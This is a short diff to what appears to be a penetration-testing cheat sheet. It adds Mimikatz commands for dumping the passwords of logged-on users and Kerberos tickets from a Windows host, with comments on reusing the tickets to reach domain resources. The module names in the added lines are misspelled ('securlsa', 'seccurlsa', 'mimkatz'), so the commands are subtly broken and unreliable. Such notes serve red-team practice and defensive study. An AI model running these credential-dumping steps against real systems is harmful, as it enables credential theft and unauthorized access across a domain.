@@ -692,6 +692,14 @@ cmd> mimikatz.exe
 mimikatz > privilege::debug
 mimikatz > token::elevate
 
+# Dump creds of all logged-on users using the Securlsa module
+mimikatz > securlsa::logonpasswords
+
+# Dump Ticket Granting Ticket and Ticket Granting Service (kerberos tickets)
+# -> Access resources associated with these tickets OR
+# -> Obtain TGS with a TGT to access specific resources we want to target in the domain.
+mimkatz > seccurlsa::tickets
+
 # Dump contents of SAM database in current host
 mimikatz > lsadump::sam
 
